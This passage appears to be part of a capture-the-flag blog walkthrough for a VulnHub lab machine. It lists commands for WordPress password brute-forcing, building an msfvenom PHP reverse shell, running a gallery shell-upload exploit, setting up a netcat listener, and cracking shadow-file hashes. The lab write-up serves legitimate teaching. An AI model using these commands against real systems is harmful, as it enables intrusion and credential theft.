+<p><code>john --wordlist=password.txt --rules --stdout &gt; out.txt</code></p>
+
+<p>now I use wpscan to brute force the password:</p>
+
+<p><code>wpscan --url 192.168.56.223/bull --wordlist out.txt --username bully</code></p>
+
+<p><img src="/images/blog/vulhub/bne03/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Now, create php reverse shell:</p>
+
+<p><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.223 -a php --platform php -o evil.php</code></p>
+
+<p>based one wpscan scan result, the wordpress slideshow gallery shell upload exploit(<a href="https://www.exploit-db.com/exploits/34681/">https://www.exploit-db.com/exploits/34681/</a>) is found. Save it as <code>wp_gallery.py</code></p>
+
+<p>run:</p>
+
+<p><code>python wp_gallery.py -t http://192.168.56.223/bull -u bully -p Bighornedbulls -f evil.php</code></p>
+
+<p><img src="/images/blog/vulhub/bne03/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>set netcat
+<code>nc -nlvp 1234</code></p>
+
+<p>visit <code>http://192.168.56.223/bull/wp-content/uploads/slideshow-gallery/evil.php</code></p>
+
+<p>get the meterpreter</p>
+
+<p><img src="/images/blog/vulhub/bne03/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>locate flag.txt and get the result <code>/tmp/flag.txt</code></p>
+
+<p>find a file shadow.bak in /tmp, I got some interesting things:</p>
+
+<p><img src="/images/blog/vulhub/bne03/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like there are more chances to me. Download this file and use john to crack more.</p>
+
+<p><code>john --fork=4 shadow.bak</code></p>
+
+<p>now I have two more accounts info</p>
+
+<p><img src="/images/blog/vulhub/bne03/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use python <code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>Login as heffer:</p>
+
+<p><img src="/images/blog/vulhub/bne03/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Login as minotaur:</p>
+
+<p><img src="/images/blog/vulhub/bne03/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[CVE-2008-1930 Wordpress 2.5 Cookie Integrity Protection Vulnerability]]></title>
